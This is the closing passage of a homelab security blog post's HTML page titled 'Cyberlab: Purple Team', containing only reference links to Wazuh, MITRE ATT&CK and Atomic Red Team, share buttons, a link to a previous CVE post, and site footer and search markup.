+<a href="https://documentation.wazuh.com" target="_blank">https://documentation.wazuh.com</a>
+<a href="https://attack.mitre.org" target="_blank">https://attack.mitre.org</a><br>
+<a href="https://github.com/redcanaryco/atomic-red-team" target="_blank">https://github.com/redcanaryco/atomic-red-team</a>
+<a href="https://github.com/wazuh/wazuh-ruleset" target="_blank">https://github.com/wazuh/wazuh-ruleset</a><br>
+<a href="https://docs.ansible.com/ansible/latest/playbook_guide" target="_blank">https://docs.ansible.com/ansible/latest/playbook_guide</a></p>
+
+        </div>
+        
+        
+
+        
+<details style="margin-left:0px" class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5">
+    
+    <summary
+        class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
+        Homelabs - This article is part of a series.
+    </summary>
+    
+    
+    
+    <div
+        class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+        Part : This Article
+    </div>
+    
+    
+
+
+</details>
+
+        
+  
+  <section class="flex flex-row flex-wrap justify-center pt-4 text-xl">
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=//localhost:1313/posts/cyberlab-ii/&amp;title=Cyberlab:%20Purple%20Team"
+      title="Share on LinkedIn"
+      aria-label="Share on LinkedIn"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://twitter.com/intent/tweet/?url=//localhost:1313/posts/cyberlab-ii/&amp;text=Cyberlab:%20Purple%20Team"
+      title="Tweet on Twitter"
+      aria-label="Tweet on Twitter"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://api.whatsapp.com/send?text=//localhost:1313/posts/cyberlab-ii/&amp;resubmit=true&amp;title=Cyberlab:%20Purple%20Team"
+      title=""
+      aria-label=""
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M380.9 97.1C339 55.1 283.2 32 223.9 32c-122.4 0-222 99.6-222 222 0 39.1 10.2 77.3 29.6 111L0 480l117.7-30.9c32.4 17.7 68.9 27 106.1 27h.1c122.3 0 224.1-99.6 224.1-222 0-59.3-25.2-115-67.1-157zm-157 341.6c-33.2 0-65.7-8.9-94-25.7l-6.7-4-69.8 18.3L72 359.2l-4.4-7c-18.5-29.4-28.2-63.3-28.2-98.2 0-101.7 82.8-184.5 184.6-184.5 49.3 0 95.6 19.2 130.4 54.1 34.8 34.9 56.2 81.2 56.1 130.5 0 101.8-84.9 184.6-186.6 184.6zm101.2-138.2c-5.5-2.8-32.8-16.2-37.9-18-5.1-1.9-8.8-2.8-12.5 2.8-3.7 5.6-14.3 18-17.6 21.8-3.2 3.7-6.5 4.2-12 1.4-32.6-16.3-54-29.1-75.5-66-5.7-9.8 5.7-9.1 16.3-30.3 1.8-3.7.9-6.9-.5-9.7-1.4-2.8-12.5-30.1-17.1-41.2-4.5-10.8-9.1-9.3-12.5-9.5-3.2-.2-6.9-.2-10.6-.2-3.7 0-9.7 1.4-14.8 6.9-5.1 5.6-19.4 19-19.4 46.3 0 27.3 19.9 53.7 22.6 57.4 2.8 3.7 39.1 59.7 94.8 83.8 35.2 15.2 49 16.5 66.6 13.9 10.7-1.6 32.8-13.4 37.4-26.4 4.6-13 4.6-24.1 3.2-26.4-1.3-2.5-5-3.9-10.5-6.6z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=//localhost:1313/posts/cyberlab-ii/&amp;description=Cyberlab:%20Purple%20Team"
+      title="Pin on Pinterest"
+      aria-label="Pin on Pinterest"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M496 256c0 137-111 248-248 248-25.6 0-50.2-3.9-73.4-11.1 10.1-16.5 25.2-43.5 30.8-65 3-11.6 15.4-59 15.4-59 8.1 15.4 31.7 28.5 56.8 28.5 74.8 0 128.7-68.8 128.7-154.3 0-81.9-66.9-143.2-152.9-143.2-107 0-163.9 71.8-163.9 150.1 0 36.4 19.4 81.7 50.3 96.1 4.7 2.2 7.2 1.2 8.3-3.3.8-3.4 5-20.3 6.9-28.1.6-2.5.3-4.7-1.7-7.1-10.1-12.5-18.3-35.3-18.3-56.6 0-54.7 41.4-107.6 112-107.6 60.9 0 103.6 41.5 103.6 100.9 0 67.1-33.9 113.6-78 113.6-24.3 0-42.6-20.1-36.7-44.8 7-29.5 20.5-61.3 20.5-82.6 0-19-10.2-34.9-31.4-34.9-24.9 0-44.9 25.7-44.9 60.2 0 22 7.4 36.8 7.4 36.8s-24.5 103.8-29 123.2c-5 21.4-3 51.6-.9 71.2C65.4 450.9 0 361.1 0 256 0 119 111 8 248 8s248 111 248 248z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://reddit.com/submit/?url=//localhost:1313/posts/cyberlab-ii/&amp;resubmit=true&amp;title=Cyberlab:%20Purple%20Team"
+      title="Submit to Reddit"
+      aria-label="Submit to Reddit"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="https://www.facebook.com/sharer/sharer.php?u=//localhost:1313/posts/cyberlab-ii/&amp;quote=Cyberlab:%20Purple%20Team"
+      title="Share on Facebook"
+      aria-label="Share on Facebook"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M504 256C504 119 393 8 256 8S8 119 8 256c0 123.78 90.69 226.38 209.25 245V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14 0 55.52 4.84 55.52 4.84v61h-31.28c-30.8 0-40.41 19.12-40.41 38.73V256h68.78l-11 71.69h-57.78V501C413.31 482.38 504 379.78 504 256z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+      
+      <a
+      target="_blank"
+      class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
+      href="mailto:?body=//localhost:1313/posts/cyberlab-ii/&amp;subject=Cyberlab:%20Purple%20Team"
+      title="Send via email"
+      aria-label="Send via email"
+      >
+      
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M207.8 20.73c-93.45 18.32-168.7 93.66-187 187.1c-27.64 140.9 68.65 266.2 199.1 285.1c19.01 2.888 36.17-12.26 36.17-31.49l.0001-.6631c0-15.74-11.44-28.88-26.84-31.24c-84.35-12.98-149.2-86.13-149.2-174.2c0-102.9 88.61-185.5 193.4-175.4c91.54 8.869 158.6 91.25 158.6 183.2l0 16.16c0 22.09-17.94 40.05-40 40.05s-40.01-17.96-40.01-40.05v-120.1c0-8.847-7.161-16.02-16.01-16.02l-31.98 .0036c-7.299 0-13.2 4.992-15.12 11.68c-24.85-12.15-54.24-16.38-86.06-5.106c-38.75 13.73-68.12 48.91-73.72 89.64c-9.483 69.01 43.81 128 110.9 128c26.44 0 50.43-9.544 69.59-24.88c24 31.3 65.23 48.69 109.4 37.49C465.2 369.3 496 324.1 495.1 277.2V256.3C495.1 107.1 361.2-9.332 207.8 20.73zM239.1 304.3c-26.47 0-48-21.56-48-48.05s21.53-48.05 48-48.05s48 21.56 48 48.05S266.5 304.3 239.1 304.3z"/></svg>
+
+  </span>
+
+
+    </a>
+      
+    
+  </section>
+
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\\Cyberlab-II\\index.md"
+        var oid_likes = "likes_posts\\Cyberlab-II\\index.md"
+      </script>
+      
+      
+      
+      <script type="text/javascript" src="/js/page.min.0860cf4e04fa2d72cc33ddba263083464d48f67de06114529043cb4623319efed4f484fd7f1730df5abea0e2da6f3538855634081d02f2d6e920b956f063e823.js" integrity="sha512-CGDPTgT6LXLMM926JjCDRk1I9n3gYRRSkEPLRiMxnv7U9IT9fxcw31q&#43;oOLabzU4hVY0CB0C8tbpILlW8GPoIw=="></script>
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/posts/cve-2023-50564/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >CVE-2023-50564 - Pluck CMS v4.7.18</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2024-08-04 00:00:00 &#43;0000 UTC">4 August 2024</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
+            title="">
+            
+            Categories
+          </a>
+        </li>
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
+            title="">
+            
+            Tags
+          </a>
+        </li>
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href=""
+            title="">
+            
+            
+          </a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2025
+      Rai2en
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.ee03488f19c93c2efb199e2e3014ea5f3cb2ce7d45154adb3399a158cac27ca52831db249ede5bb602700ef87eb02434139de0858af1818ab0fb4182472204a4.js" integrity="sha512-7gNIjxnJPC77GZ4uMBTqXzyyzn1FFUrbM5mhWMrCfKUoMdsknt5btgJwDvh&#43;sCQ0E53ghYrxgYqw&#43;0GCRyIEpA=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="//localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
